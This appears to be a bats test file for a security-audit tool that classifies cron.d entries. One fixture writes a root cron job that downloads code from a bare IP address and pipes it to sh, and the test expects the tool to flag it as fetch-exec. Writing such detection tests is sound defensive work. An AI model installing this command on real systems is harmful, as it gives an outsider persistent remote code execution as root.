#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; }

@test "hand-dropped cron.d entry is attention; loud when it fetch-execs" {
  _PM=rpm
  pkg_owns() { return 1; }   # not package-owned
  echo '* * * * * root curl http://5.9.1.2/x | sh' > "$ROOT/etc/cron.d/evil"
  check_scheduled
  emitted attention "evil"
  emitted attention "fetch-exec"
}

@test "package-owned cron file is normal" {
  _PM=rpm
  pkg_owns() { return 0; }   # owned
  echo '0 3 * * * root /usr/bin/logrotate' > "$ROOT/etc/cron.d/logrotate"
  check_scheduled
  emitted normal "logrotate"
}
